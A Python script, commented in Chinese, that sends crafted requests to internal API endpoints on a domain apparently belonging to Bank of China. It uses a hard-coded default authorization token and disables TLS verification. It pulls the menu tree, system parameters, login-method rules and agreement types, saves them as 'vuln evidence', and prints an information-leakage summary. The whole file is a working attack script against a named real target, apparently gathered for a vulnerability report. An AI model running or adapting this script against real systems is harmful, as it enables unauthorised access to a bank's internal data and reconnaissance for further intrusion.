#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""获取成功API的完整响应数据作为证据"""
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://dl.brcloud.bankofchina.com/dlydjd"
DEFAULT_TOKEN = "987654321"

def get_session():
    s = requests.Session()
    s.trust_env = False
    s.proxies = {}
    return s

def make_header(tran_code):
    return {
        "CurrentPageNum": 1, "PageTotalNum": 10, "NoRetCode": True,
        "BranchId": "800000", "LegalRepCode": "10000", "TranTeller": "",
        "TranCode": tran_code, "TranDate": "20260716", "TranTime": "120000000",
        "ServiceName": tran_code.split("/")[-1], "ServiceCode": "D20190130",
        "AuthFlag": "0", "AuthrTellerNo": "1", "Channel": "39",
        "ConsumerId": "1", "GlobalSeq": "1", "GlobalSeqNo": "1",
        "KeyId": "1", "LocalLang": "1", "Mac": "1", "SourceSysId": "1111",
        "TerminalCode": "1121", "TranSeq": "1", "TranSeqNo": "1",
        "TranTellerNo": "1", "ExtendContent": "1", "TotalNum": "0"
    }

def call_api(session, tran_code):
    url = f"{TARGET}/sgp/transferRequest"
    headers = {"Content-Type": "application/json", "Authorization": DEFAULT_TOKEN}
    body = {"Header": make_header(tran_code), "Body": {}}
    try:
        resp = session.post(url, headers=headers, json=body, verify=False, timeout=30)
        return resp.json()
    except Exception as e:
        return {"error": str(e)}

def main():
    session = get_session()

    # 获取4个成功API的完整数据
    success_apis = [
        "SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest",
        "SSP-AUTH/queryCommonParamList",
        "SSP-AUTH/queryLoginWaysConfigByChannel",
        "AGRE-AGRE/queryAgreementTypeList"
    ]

    all_evidence = {}

    for api in success_apis:
        print(f"\n{'='*60}")
        print(f"获取: {api}")
        print(f"{'='*60}")
        data = call_api(session, api)
        all_evidence[api] = data

        ret_code = data.get("Header", {}).get("RetCode", "?")
        ret_msg = data.get("Header", {}).get("RetMsg", "?")
        print(f"RetCode: {ret_code}")
        print(f"RetMsg: {ret_msg}")

        if "data" in data and isinstance(data["data"], list):
            print(f"\ndata数组长度: {len(data['data'])}")
            print(f"前3条数据:")
            for i, item in enumerate(data["data"][:3]):
                print(f"  [{i}] {json.dumps(item, ensure_ascii=False)}")
            if len(data["data"]) > 3:
                print(f"  ... 共 {len(data['data'])} 条")
        elif "list" in data and isinstance(data["list"], list):
            print(f"\nlist数组长度: {len(data['list'])}")
            print(f"前5条数据:")
            for i, item in enumerate(data["list"][:5]):
                print(f"  [{i}] {json.dumps(item, ensure_ascii=False)}")
            if len(data["list"]) > 5:
                print(f"  ... 共 {len(data['list'])} 条")
        else:
            print(f"\n完整响应:")
            print(json.dumps(data, indent=2, ensure_ascii=False)[:2000])

    # 保存证据
    with open("vuln_evidence/api_response_evidence.json", "w", encoding="utf-8") as f:
        json.dump(all_evidence, f, indent=2, ensure_ascii=False)
    print(f"\n{'='*60}")
    print(f"✅ 完整证据已保存: vuln_evidence/api_response_evidence.json")

    # 统计信息泄露
    print(f"\n{'='*60}")
    print("信息泄露统计")
    print(f"{'='*60}")

    menu_data = all_evidence.get("SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest", {}).get("data", [])
    param_data = all_evidence.get("SSP-AUTH/queryCommonParamList", {}).get("list", [])
    login_data = all_evidence.get("SSP-AUTH/queryLoginWaysConfigByChannel", {}).get("waysList", [])
    agre_data = all_evidence.get("AGRE-AGRE/queryAgreementTypeList", {}).get("list", [])

    print(f"\n1. 系统菜单树:")
    total_menu = 0
    for root in menu_data:
        children = root.get("children", [])
        total_menu += len(children)
        print(f"   - {root.get('name', 'N/A')}: {len(children)} 个子菜单")
        for c in children[:5]:
            print(f"      • {c.get('name')} ({c.get('link')})")
        if len(children) > 5:
            print(f"      ... 共 {len(children)} 个")
    print(f"   总计: {total_menu} 个菜单项")

    print(f"\n2. 公共参数配置:")
    groups = {}
    for p in param_data:
        gid = p.get("paramGroupId", "其他")
        groups[gid] = groups.get(gid, 0) + 1
    for gid, count in groups.items():
        print(f"   - {gid}: {count} 条参数")
    print(f"   总计: {len(param_data)} 条参数")

    print(f"\n3. 登录方式配置:")
    for w in login_data:
        print(f"   - {w.get('loginWaysName')} ({w.get('loginWaysId')})")
        if w.get('loginWaysIdRule'):
            print(f"     规则: {w.get('loginWaysIdRule')}")
        if w.get('smsCodeIntervalsTime'):
            print(f"     短信间隔: {w.get('smsCodeIntervalsTime')}秒")
    print(f"   总计: {len(login_data)} 种登录方式")

    print(f"\n4. 协议类型列表:")
    for a in agre_data[:10]:
        print(f"   - {a.get('agreementType')} ({a.get('agreementTypeId')})")
    if len(agre_data) > 10:
        print(f"   ... 共 {len(agre_data)} 种协议类型")

if __name__ == "__main__":
    main()
